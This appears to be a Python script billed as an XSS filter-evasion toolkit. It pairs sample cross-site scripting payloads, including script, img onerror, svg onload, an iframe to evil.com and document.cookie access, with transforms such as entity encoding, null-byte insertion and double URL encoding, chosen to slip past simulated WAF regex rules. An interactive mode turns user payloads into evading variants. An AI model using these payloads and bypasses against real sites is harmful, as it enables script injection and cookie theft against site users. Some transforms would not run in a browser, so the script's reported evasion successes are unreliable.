"""
XSS Payload Obfuscator & Filter Evasion Toolkit
Bypasses character-based WAF detection using encoding and transformation tricks.
"""

import re
import sys
import io
import random
import string
import urllib.parse
from typing import List, Tuple, Dict

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

# ── Filter Signatures (Simulated WAF Rules) ─────────────────────────────

FILTER_RULES: Dict[str, str] = {
    "ScriptTag":        r"<\s*script[\s>]",
    "EventHandler":     r"\bon\w+\s*=",
    "JavascriptProto":  r"javascript\s*:",
    "ImgOnEvent":       r"<\s*img[^>]+on\w+\s*=",
    "SvgElement":       r"<\s*svg[\s>/]",
    "IframeElement":    r"<\s*iframe[\s>]",
    "EvalFunction":     r"\beval\s*\(",
    "AlertFunc":         r"\b(alert|prompt|confirm)\s*\(",
    "CookieAccess":     r"document\s*\.\s*cookie",
    "MouseDown":        r"\bon(mouse\w+|key\w+|focus|blur)\s*=",
}

# ── Evasion Transformers ────────────────────────────────────────────────

def encode_html_entities(payload: str) -> str:
    result = []
    for ch in payload:
        if random.random() > 0.5:
            result.append(f"&#{ord(ch)};")
        else:
            result.append(ch)
    return "".join(result)


def swap_case_random(payload: str) -> str:
    out = []
    for ch in payload:
        if ch.isalpha() and random.random() > 0.4:
            out.append(ch.upper() if ch.islower() else ch.lower())
        else:
            out.append(ch)
    return "".join(out)


def insert_null_bytes(payload: str) -> str:
    chars = list(payload)
    for i in range(len(chars) - 1, 0, -1):
        if random.random() > 0.7:
            chars.insert(i, "\x00")
    return "".join(chars)


def url_encode_full(payload: str) -> str:
    return urllib.parse.quote(payload, safe="")


def hex_encode_tags(payload: str) -> str:
    return payload.replace("<", "%3c").replace(">", "%3e")


def double_url_encode(payload: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def jsfuck_style_chunks(payload: str) -> str:
    return payload.replace("alert", "al\u0000ert").replace("script", "scr\u0000ipt")


def whitespace_injection(payload: str) -> str:
    tags = re.findall(r"<\s*/?\s*\w+", payload)
    result = payload
    for tag in tags:
        clean = tag.replace(" ", "").replace("\t", "")
        noisy = clean[0] + "".join(
            random.choice([" ", "\t", "\n", "\r", "\x0b", "\x0c"]) + c
            for c in clean[1:]
        )
        result = result.replace(tag, noisy, 1)
    return result


def case_mix_tags(payload: str) -> str:
    result = payload
    for tag in ["script", "Script", "SCRIPT"]:
        mixed = ""
        for ch in tag:
            mixed += ch.upper() if random.random() > 0.5 else ch.lower()
        result = result.replace(tag, mixed)
    return result


def break_event_handlers(payload: str) -> str:
    return re.sub(r"(on\w+)=", lambda m: m.group(1) + " = ", payload)


def htmlCommentSplit(payload: str) -> str:
    result = payload
    for keyword in ["script", "alert", "iframe"]:
        if keyword in result.lower():
            idx = result.lower().index(keyword)
            mid = len(keyword) // 2
            result = result[:idx + mid] + "<!-->" + result[idx + mid:]
    return result


# ── Evasion Pipeline ────────────────────────────────────────────────────

EVASION_METHODS = [
    ("HTML Entity Encoding",    encode_html_entities),
    ("Case Randomization",     swap_case_random),
    ("Null Byte Injection",    insert_null_bytes),
    ("URL Encoding",           url_encode_full),
    ("Hex Tag Encoding",       hex_encode_tags),
    ("Double URL Encoding",    double_url_encode),
    ("JS Chunk Insertion",     jsfuck_style_chunks),
    ("Whitespace Injection",   whitespace_injection),
    ("Mixed-Case Tags",        case_mix_tags),
    ("Event Handler Break",    break_event_handlers),
    ("Comment Splitting",      htmlCommentSplit),
]


# ── Filter Checker ──────────────────────────────────────────────────────

def check_filter(payload: str) -> List[Tuple[str, str]]:
    triggered = []
    for rule_name, pattern in FILTER_RULES.items():
        match = re.search(pattern, payload, re.IGNORECASE)
        if match:
            triggered.append((rule_name, match.group()))
    return triggered


# ── Base Payloads ───────────────────────────────────────────────────────

PAYLOAD_SAMPLES = [
    ("Basic Script",
     "<script>alert('XSS')</script>"),
    ("Img OnError",
     '<img src=x onerror=alert(1)>'),
    ("Svg OnLoad",
     '<svg onload=alert(1)>'),
    ("Iframe Inject",
     '<iframe src="http://evil.com">'),
    ("JS Protocol Link",
     'javascript:alert(document.cookie)'),
    ("Body OnLoad",
     '<body onload=alert(1)>'),
    ("Eval Execution",
     "eval('alert(1)')"),
    ("Prompt Dialog",
     "prompt('Enter credentials')"),
    ("Cookie Reader",
     "document.cookie"),
    ("Confirm Dialog",
     "confirm('Proceed?')"),
]


# ── Evasion Engine ──────────────────────────────────────────────────────

def run_evasion_tests():
    print("\n" + "=" * 70)
    print("  XSS Payload Obfuscator — Filter Evasion Toolkit")
    print("=" * 70)

    evaded = 0
    caught = 0

    for label, base_payload in PAYLOAD_SAMPLES:
        print(f"\n  [{label}]")
        print(f"    Original: {base_payload[:60]}")

        triggers = check_filter(base_payload)
        if not triggers:
            print(f"    Status: ALREADY EVADING (no rules matched)")
            evaded += 1
            continue

        print(f"    Blocked by: {', '.join(r for r, _ in triggers)}")

        for method_name, transformer in EVASION_METHODS:
            transformed = transformer(base_payload)
            new_triggers = check_filter(transformed)

            if not new_triggers:
                print(f"    >> EVASION via {method_name}")
                print(f"       Payload: {transformed[:60]}")
                evaded += 1
                break
        else:
            print(f"    >> CAUGHT by all filters")
            caught += 1

    total = evaded + caught
    print("\n" + "=" * 70)
    print(f"  TOTAL TESTS: {total}")
    print(f"  Evaded:      {evaded}")
    print(f"  Caught:      {caught}")
    print(f"  Success:     {(evaded / total * 100):.1f}%")
    print("=" * 70 + "\n")


def interactive_mode():
    print("\n" + "=" * 70)
    print("  INTERACTIVE MODE — Enter your own payload")
    print("=" * 70)
    print("  Type 'quit' to exit\n")

    while True:
        try:
            user_input = input("  Payload> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if user_input.lower() == "quit":
            break

        triggers = check_filter(user_input)
        if triggers:
            print(f"  Blocked by: {', '.join(r for r, _ in triggers)}")
            for method_name, transformer in EVASION_METHODS:
                transformed = transformer(user_input)
                if not check_filter(transformed):
                    print(f"  Evaded with {method_name}: {transformed[:60]}")
                    break
            else:
                print("  All evasion methods failed for this payload.")
        else:
            print("  Payload passed all filters (no rules matched).")
        print()


def main():
    run_evasion_tests()
    interactive_mode()


if __name__ == "__main__":
    main()
